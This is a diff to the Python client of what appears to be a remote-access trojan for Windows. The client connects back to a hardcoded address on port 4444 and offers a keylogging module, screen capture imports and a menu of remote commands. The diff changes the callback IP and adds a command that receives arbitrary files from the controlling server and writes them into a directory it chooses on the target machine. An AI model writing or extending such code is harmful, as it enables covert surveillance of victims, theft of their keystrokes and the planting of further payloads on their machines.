@@ -3,18 +3,13 @@ import time
 import os
 import subprocess
 import cv2
-import numpy as np
 import io
-import struct
 import mimetypes
 import base64
 import win32file
 import win32api
 import win32gui
 import win32ui
-import win32con
-import win32net
-import win32netcon
 import pickle
 import ctypes
 import sys
@@ -25,7 +20,7 @@ import pynput
 import datetime
 from PIL import ImageGrab, Image
 
-IP, PORT = '192.168.0.104', 4444
+IP, PORT = '192.168.0.103', 4444
 
 
 # ============================================================================
@@ -588,8 +583,62 @@ while True:
                             err_msg = f"获取文件信息失败：{str(e)}"
                             err_bytes = err_msg.encode('gbk', errors='ignore')
                             client.sendall(f"{len(err_bytes):08d}".encode() + err_bytes)
-
-
+                    #接受文件
+                    elif sinter_list[0]=='send':
+                        target_dir = sinter_list[1]  # 服务端指定的目标目录
+                        try:
+                            # 发送就绪信号
+                            client.sendall(b"READY")
+                            # 接收文件名（8字节长度头 + 文件名数据）
+                            filename_len_data = b''
+                            while len(filename_len_data) < 8:
+                                chunk = client.recv(8 - len(filename_len_data))
+                                if not chunk:
+                                    raise ConnectionError("连接断开")
+                                filename_len_data += chunk
+                            filename_len = int(filename_len_data.decode())
+                            # -1 表示服务端取消发送
+                            if filename_len < 0:
+                                print(f"[!] 服务端取消了文件发送")
+                                continue
+                            filename_data = b''
+                            while len(filename_data) < filename_len:
+                                chunk = client.recv(filename_len - len(filename_data))
+                                if not chunk:
+                                    raise ConnectionError("连接断开")
+                                filename_data += chunk
+                            filename = filename_data.decode('utf-8')
+                            file_path = os.path.join(target_dir, filename)
+                            client.sendall(b"OK")
+                            # 接收 8 字节文件大小（8 位补零，负数表示取消）
+                            file_size_data = b''
+                            while len(file_size_data) < 8:
+                                chunk = client.recv(8 - len(file_size_data))
+                                if not chunk:
+                                    raise ConnectionError("连接断开")
+                                file_size_data += chunk
+                            file_size = int(file_size_data.decode())
+                            if file_size < 0:
+                                print(f"[!] 服务端取消了文件发送")
+                                continue
+                            # 确认就绪
+                            client.sendall(b"OK")
+                            # 循环接收文件数据直到收满
+                            file_data = b''
+                            while len(file_data) < file_size:
+                                chunk = client.recv(min(4096, file_size - len(file_data)))
+                                if not chunk:
+                                    raise ConnectionError("连接断开")
+                                file_data += chunk
+                            # 写入文件
+                            with open(file_path, 'wb') as f:
+                                f.write(file_data)
+                            print(f"[+] 文件已接收并保存至：{file_path}")
+                            client.sendall(b"SUCCESS")
+                        except Exception as e:
+                            # 发送 7 字节错误信号（与服务端 recv_exact(7) 匹配）
+                            client.sendall(b"ERROR  ")
+                            continue
             # 模块5：键盘记录
             elif choice == '5':
                 with keylog_lock:
